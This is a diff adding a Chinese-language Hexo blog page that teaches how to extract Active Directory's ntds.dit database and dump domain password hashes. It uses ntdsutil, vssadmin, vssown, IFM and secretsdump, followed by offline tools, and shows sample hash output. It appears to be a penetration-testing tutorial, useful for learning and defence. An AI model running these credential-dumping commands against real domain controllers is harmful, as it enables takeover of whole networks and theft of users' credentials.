@@ -1,0 +1,1882 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Hexo">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Hexo</title>
+    <link rel="icon" type="image/png" href="../../../../../../../../favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="../../../../../../../../libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../../libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../../libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../../libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../../libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../../css/matery.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../../css/my.css">
+
+    <script src="../../../../../../../../libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="../../../../../../../../index.html" class="waves-effect waves-light">
+                    
+                    <img src="../../../../../../../../medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../../index.html" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../../tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../../categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../../archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../../about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../../contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../../friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="../../../../../../../../medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../../index.html" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../../tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../../categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../../archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../../about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../../contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../../friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../../../../../medias/featureimages/0.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title"></h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="../../../../../../../../libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-07-16
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    6.8k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    28 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="../../../../../../../../libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="ntds-dit文件的介绍"><a href="#ntds-dit文件的介绍" class="headerlink" title="ntds.dit文件的介绍"></a>ntds.dit文件的介绍</h1><h2 id="Ntds-dit介绍"><a href="#Ntds-dit介绍" class="headerlink" title="Ntds.dit介绍"></a>Ntds.dit介绍</h2><p>ntds.dit为<strong>ad</strong>的数据库，内容有域用户、域组、用户hash等信息，域控上的ntds dit只有可以登录到域控的用户(如域管用户、DC本地管理员用户)可以访问。<strong>ntds.dit</strong>包括三个主要表: <strong>数据表、链接表、 sd表</strong>。所以只要在域渗透中能够获取到ntds.dit就可以获取到所有域用户的用户名和对应的hash,它和SAM文件一样， 被windows系统锁死</p>
+<h2 id="Ntds-dit位置"><a href="#Ntds-dit位置" class="headerlink" title="Ntds.dit位置"></a>Ntds.dit位置</h2><pre class="line-numbers language-none"><code class="language-none">C:\windows\NTDS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="assets/image-20230410162525893.png" alt="image-20230410162525893"></p>
+<h1 id="多种方式提取和移动ntds-dit文件"><a href="#多种方式提取和移动ntds-dit文件" class="headerlink" title="多种方式提取和移动ntds.dit文件"></a>多种方式提取和移动ntds.dit文件</h1><h2 id="ntdsutils-exe提取ntds-dit"><a href="#ntdsutils-exe提取ntds-dit" class="headerlink" title="ntdsutils.exe提取ntds.dit"></a>ntdsutils.exe提取ntds.dit</h2><p><code>ntdsutils.exe</code>是-一个为活动目录提供管理机制的命令行工具，使用<code>ntdsutils. exe</code>可以维护和管理活动目录数<br>据库、控制单个主机操作、创建应用程序目录分区等，该工具默认安装在<strong>域控服务器</strong>上，可以在域控制器上直接操<br>作，支持windows server 2003、2008、 2012. 提取过程分为3步:</p>
+<h3 id="第一步-创建快照"><a href="#第一步-创建快照" class="headerlink" title="第一步:创建快照"></a>第一步:创建快照</h3><pre class="line-numbers language-none"><code class="language-none">ntdsutil.exe snapshot "activate instance ntds" create q q <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>可以看到快照的uid是<code>ba67006b-cf90-46fd-a792-fabd54e3790e</code></p>
+<p><img src="assets/image-20230410162855869.png" alt="image-20230410162855869"></p>
+<pre class="line-numbers language-none"><code class="language-none">如果报错：
+错误 0x80042302(卷影复制服务组件遇到了意外错误。
+请检查应用程序事件日志以了解详细信息。)
+
+卷影复制服务错误：
+则在服务中启动“Volume Shadow Copy”服务，并改为”自动”
+
+更改系统还原设置：
+1.在 “运行”中输入“gpedit.msc”。
+2. 转到“计算机配置”\“管理模板”\“系统”\“系统还原”。
+3. 双击右侧的“关闭系统还原”并将其设置为“未配置”。
+
+在电脑上运行系统文件检查器（SFC）：
+1. 以管理员身份运行CMD。
+2. 输入“sfc /scannow”。
+3. 等待完成后，查看问题是否解决。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="第二步-加载快照"><a href="#第二步-加载快照" class="headerlink" title="第二步:加载快照"></a>第二步:加载快照</h3><pre class="line-numbers language-none"><code class="language-none">ntdsutil.exe snapshot "mount {ba67006b-cf90-46fd-a792-fabd54e3790e}" q q <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="assets/image-20230410162931059.png" alt="image-20230410162931059"></p>
+<p>可以看到快照的地址为<code>C:\$SNAP_202304101656_VOLUMEC$\</code></p>
+<h3 id="第三步-复制快照中的ntds-dit文件"><a href="#第三步-复制快照中的ntds-dit文件" class="headerlink" title="第三步:复制快照中的ntds.dit文件"></a>第三步:复制快照中的ntds.dit文件</h3><pre class="line-numbers language-none"><code class="language-none">copy '快照地址\windows\NTDS\ntds.dit' 目标地址
+
+eg:
+copy C:\$SNAP_202304101656_VOLUMEC$\Windows\NTDS\ntds.dit C:\Users\Administrator\desktop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="第四步-删除快照"><a href="#第四步-删除快照" class="headerlink" title="第四步:删除快照"></a>第四步:删除快照</h3><pre class="line-numbers language-none"><code class="language-none">ntdsutil.exe snapshot "umount {ba67006b-cf90-46fd-a792-fabd54e3790e}" "delete {ba67006b-cf90-46fd-a792-fabd54e3790e}" q q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="vssadmin提取ntds-dit"><a href="#vssadmin提取ntds-dit" class="headerlink" title="vssadmin提取ntds.dit"></a>vssadmin提取ntds.dit</h2><p>vssadmin1是Windows Server 2008及Windows 7系统提供的VSS管理工具，它可以用于创建或删除卷影副本,<br>列出卷影副本的信息(只能管理系统Provider创建的卷影副本)。还可以用于显示所有安装的所有卷影副本写入程<br>序(writers) 和提供程序(providers) ，以及改变卷影副本存储空间(即所谓的”diff空间”)的大小等。支持的操<br>作系统: Server 2008、Server 2012</p>
+<h3 id="第一步-创建快照-1"><a href="#第一步-创建快照-1" class="headerlink" title="第一步:创建快照."></a>第一步:创建快照.</h3><pre class="line-numbers language-none"><code class="language-none">vssadmin create shadow /for=C:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>521e9314-3be7-4342-98d2-be7f744ae031</code></p>
+<p> <code>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2 </code></p>
+<p><img src="assets/image-20230410172211914.png" alt="image-20230410172211914"></p>
+<h3 id="第二步-复制文件"><a href="#第二步-复制文件" class="headerlink" title="第二步:复制文件"></a>第二步:复制文件</h3><pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit C:\users\Administrator\Desktop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="assets/image-20230410172410979.png" alt="image-20230410172410979"></p>
+<h3 id="第三步-删除快照"><a href="#第三步-删除快照" class="headerlink" title="第三步:删除快照"></a>第三步:删除快照</h3><pre class="line-numbers language-none"><code class="language-none">vssadmin delete shadows /for=c: /quiet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="assets/image-20230410181304076.png" alt="image-20230410181304076"></p>
+<h2 id="vssown提取ntds-dit"><a href="#vssown提取ntds-dit" class="headerlink" title="vssown提取ntds.dit"></a>vssown提取ntds.dit</h2><p>vssown.vbs和vssadmin类似，它是由Tim Tomes开发完成的，它可以创建和删除卷影副本，以及启动和停止卷影复制服务</p>
+<p>github链接:<a target="_blank" rel="noopener" href="https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs">https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs</a></p>
+<h3 id="第一步-启动卷影复制服务"><a href="#第一步-启动卷影复制服务" class="headerlink" title="第一步:启动卷影复制服务"></a>第一步:启动卷影复制服务</h3><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs /start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="第二步-创建一个C盘的卷影副本"><a href="#第二步-创建一个C盘的卷影副本" class="headerlink" title="第二步:创建一个C盘的卷影副本"></a>第二步:创建一个C盘的卷影副本</h3><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs /create c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="第三步-列出当前卷影副本"><a href="#第三步-列出当前卷影副本" class="headerlink" title="第三步:列出当前卷影副本"></a>第三步:列出当前卷影副本</h3><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs /list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="assets/image-20230410183139315.png" alt="image-20230410183139315"></p>
+<h3 id="第四步-复制文件"><a href="#第四步-复制文件" class="headerlink" title="第四步:复制文件:"></a>第四步:复制文件:</h3><pre class="line-numbers language-none"><code class="language-none">copy \\?\GLOBALROOT\Device\HarddiskvolumeShadowCopy3\windows\NTDS\ntds.dit C:\users\Administrator\Desktop\ntds\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="第五步-删除卷影副本"><a href="#第五步-删除卷影副本" class="headerlink" title="第五步:删除卷影副本"></a>第五步:删除卷影副本</h3><pre class="line-numbers language-none"><code class="language-none">cscript vssown.vbs /delete {81571CDB-A5CA-4365-BDD1-286754941D24}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="IFM"><a href="#IFM" class="headerlink" title="IFM"></a>IFM</h2><p>可以通过创建一个IFM的方式获取ntds.dit,在使用ntdsutil创建媒体安装集(IFM) 时，需要进行生成快照、加<br>载、将ntds.dit 和计算机的SAM文件复制到目标文件夹中等操作，这些操作也可以通过PowerShell或VMI远程<br>执行。</p>
+<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步:"></a>第一步:</h3><pre class="line-numbers language-none"><code class="language-none">ntdsutil "ac i ntds" "ifm" "create full C:/test" q q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>此时ntds.dit将被保存在<code>C:\test\Active Directory</code> 下, </p>
+<p>SYSTEN 和SECURITY两个文件将被保存在<code>C:\test\registry</code>文件夹下</p>
+<p><img src="assets/image-20230410195515722.png" alt="image-20230410195515722"></p>
+<h3 id="第二步-删除"><a href="#第二步-删除" class="headerlink" title="第二步:删除"></a>第二步:删除</h3><pre class="line-numbers language-none"><code class="language-none">rmdir /s/q C:\test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h2><p>通过<strong>impacket</strong>里的<strong>secretsdump.py</strong>脚本可以直接远程读取ntds.dit 并导出哈希值</p>
+<pre class="line-numbers language-none"><code class="language-none">secretsdump.exe 域名/administrator:密码@IP -outputfile output_ntds
+
+eg:
+secretsdump.exe hack.com/administrator:123456kl;'@192.168.70.16 -outputfile output_ntds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="离线方式读取ntds-dit文件"><a href="#离线方式读取ntds-dit文件" class="headerlink" title="离线方式读取ntds.dit文件"></a>离线方式读取ntds.dit文件</h1><p>离线一般需要两步:</p>
+<ol>
+<li>将远端域控的ntds.dit下载到本地，</li>
+<li>然后利用再在本地进行。</li>
+</ol>
+<p>注意:因为<strong>system.hive</strong>里存放着ntds.dit的<strong>秘钥</strong>，所以需要转储system.hive，不然没法查看ntds.dit里内容</p>
+<p>命令如下: .</p>
+<pre class="line-numbers language-none"><code class="language-none">reg save hklm\system C:\system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>下面介绍几种方式离线读取ntds.dit文件</p>
+<h2 id="esedbexport"><a href="#esedbexport" class="headerlink" title="esedbexport"></a>esedbexport</h2><p><strong>取证工具</strong></p>
+<h3 id="1、安装esedbexport"><a href="#1、安装esedbexport" class="headerlink" title="1、安装esedbexport"></a>1、安装esedbexport</h3><p>github下载地址：<a target="_blank" rel="noopener" href="https://github.com/libyal/libesedb/releases/">https://github.com/libyal/libesedb/releases/</a></p>
+<p>我们以kali为例子</p>
+<pre class="line-numbers language-none"><code class="language-none">apt-get install autoconf automake autopoint libtool pkg-config
+wget https://github.com/libyal/libesedb/releases/download/20230318/libesedb-experimental-20230318.tar.gz
+tar zxvf libesedb-experimental-20230318.tar.gz
+cd libesedb-20230318
+./configure
+make
+make install
+ldconfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="2、导出ntds-dit"><a href="#2、导出ntds-dit" class="headerlink" title="2、导出ntds.dit"></a>2、导出ntds.dit</h3><p><strong>两个重要的表为: datatable以及link table, 他们都会被存放在./ntds.dit.export/文件夹中</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">esedbexport -m tables ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="3、安装ntdsxtract"><a href="#3、安装ntdsxtract" class="headerlink" title="3、安装ntdsxtract"></a>3、安装ntdsxtract</h3><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/csababarta/ntdsxtract.git
+cd ntdsxtract
+python2 setup.py build
+python2 setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>如果提示ImportError: No module named Crypto.Hash,请执行</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">curl -o get-pip.py https://bootstrap.pypa.io/pip/2.7/get-pip.py
+sudo python2 get-pip.py
+pip install pycryptodome<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="4、导出哈希值"><a href="#4、导出哈希值" class="headerlink" title="4、导出哈希值"></a>4、导出哈希值</h3><p>将<strong>ntds.dit.export和SYSTEM文件</strong>放入到<strong>ntdsxtract工具的文件夹</strong>中，然后导出哈希值，最后的结果将保存在1.txt里</p>
+<pre class="line-numbers language-none"><code class="language-none">python2 dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.7 output --syshive SYSTEM --passwordhasher --pwdformat ocl --ntoufile atout --lmoufile lmout | tee 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="impacket-1"><a href="#impacket-1" class="headerlink" title="impacket"></a>impacket</h2><p>将ntds.dit.export和SYSTEM文件放入到和<strong>secretsdump.exe</strong>同级目录下</p>
+<pre class="line-numbers language-none"><code class="language-none">secretsdump.exe -system system.hive -ntds ntds.dit LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="assets/image-20230412133801934.png" alt="image-20230412133801934"></p>
+<h2 id="NTDSDump-exe"><a href="#NTDSDump-exe" class="headerlink" title="NTDSDump.exe"></a>NTDSDump.exe</h2><p><strong>NTDSDumpEx.exe可以进行导出哈希值的操作</strong></p>
+<p>github下载:<a target="_blank" rel="noopener" href="https://github.com/zcgonvh/NTDSDumpEx/releases/tag/v0.3">https://github.com/zcgonvh/NTDSDumpEx/releases/tag/v0.3</a></p>
+<pre class="line-numbers language-none"><code class="language-none">NTDSDumpEx -d ntds.dit -s system.hive -o 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">Administrator:500:aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC:1001:aad3b435b51404eeaad3b435b51404ee:1f0e20e21088dae3bfcfcf6d5f8bd98e:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d5adb4aa3a471374f46ba24ba01cb08b:::
+jack:1105:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+jack:1106:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+jack:1107:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+jack:1108:aad3b435b51404eeaad3b435b51404ee:e45a314c664d40a227f9540121d1a29d:::
+lihua:1110:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+lihua:1111:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+lihua:1112:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+lihua:1113:aad3b435b51404eeaad3b435b51404ee:68faaeedea6e05549453d18b03c6a8d2:::
+kkk:1118:aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="DSInternals"><a href="#DSInternals" class="headerlink" title="DSInternals"></a>DSInternals</h2><p>DSInternals是powershell脚本，可以离线读取ntds文件</p>
+<p>github下载：<a target="_blank" rel="noopener" href="https://github.com/MichaelGrafnetter/DSInternals">https://github.com/MichaelGrafnetter/DSInternals</a></p>
+<h3 id="安装DSInternals"><a href="#安装DSInternals" class="headerlink" title="安装DSInternals"></a>安装DSInternals</h3><pre class="line-numbers language-none"><code class="language-none">Install-Module DSInternals -Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="导出hash-并保存在txt文件里"><a href="#导出hash-并保存在txt文件里" class="headerlink" title="导出hash,并保存在txt文件里"></a>导出hash,并保存在txt文件里</h3><pre class="line-numbers language-none"><code class="language-none">$key = Get-Bootkey -SystemHivePath 'system路径'
+Get-ADDBAccount -All -DBPath 'ntds路径' -Bootkey $key | Out-File output_hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h1 id="在线方式读取ntds-dit文件"><a href="#在线方式读取ntds-dit文件" class="headerlink" title="在线方式读取ntds.dit文件"></a>在线方式读取ntds.dit文件</h1><p>在线的方式就是直接读取不需要在导出ntds文件,在域环境中，不要直接在线获取hash,特别是域环境比较大的时<br>候，在线获取hash等待时时间较长，工具占用资源太多，容易造成域控服务器崩溃</p>
